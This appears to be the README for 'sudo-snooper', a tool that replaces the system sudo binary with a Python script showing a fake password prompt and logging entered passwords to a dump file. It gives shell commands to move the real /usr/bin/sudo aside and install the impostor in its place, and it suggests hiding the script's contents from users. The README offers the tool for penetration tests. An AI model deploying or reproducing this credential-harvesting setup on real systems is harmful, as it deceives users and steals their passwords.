# sudo-snooper

sudo-snooper acts like the original sudo binary to fool users into entering their passwords.

It will show a fake prompt just like the original to the user to enter their sudo password.

This can be useful in penetration tests or security evaluations for testing user knowledge.

## Installation steps

* move the original sudo binary to another name

```
# mv /usr/bin/sudo /usr/bin/somename
```

* change the parameters in the file to your liking

Change these in sudo-snooper.py:

```
dumpdir = "/tmp/snooper"
dumpfile = "/tmp/snooper/dump.txt"
sudo = 'sudo'
```

* install the python file in /usr/bin/sudo (or wherever sudo was before)
```
# install -dm755 sudo-snooper.py /usr/bin/sudo
```

* give the necessary permissions to the python file
  You can go fancy here and make a non-readable executable file for users, but I'm not going into that. Check some of the answers [here](http://unix.stackexchange.com/questions/16623/file-permission-execute-only) for that.

## TODO:

* handle when user enters wrong password
* don't ask for a password when the user has an active sudo session
